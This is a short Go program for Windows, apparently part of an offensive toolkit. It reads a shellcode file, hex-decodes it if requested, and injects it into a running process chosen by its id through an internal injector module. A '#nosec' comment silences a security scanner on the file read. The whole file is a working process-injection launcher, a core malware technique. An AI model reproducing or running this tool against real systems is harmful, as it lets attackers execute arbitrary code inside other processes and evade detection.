// +build windows

package main

import (
	"encoding/hex"
	"flag"
	"io/ioutil"

	"project/internal/module/windows/injector"
	"project/internal/system"
)

func main() {
	var (
		pid    int
		format string
		input  string
	)
	flag.IntVar(&pid, "p", 0, "target process id")
	flag.StringVar(&format, "f", "raw", "shellcode format")
	flag.StringVar(&input, "i", "", "input shellcode file path")
	flag.Parse()

	if pid == 0 {
		system.PrintError("input pid")
	}
	scData, err := ioutil.ReadFile(input) // #nosec
	system.CheckError(err)
	if format == "hex" {
		scData, err = hex.DecodeString(string(scData))
		system.CheckError(err)
	}

	err = injector.InjectShellcode(uint32(pid), scData)
	system.CheckError(err)
}
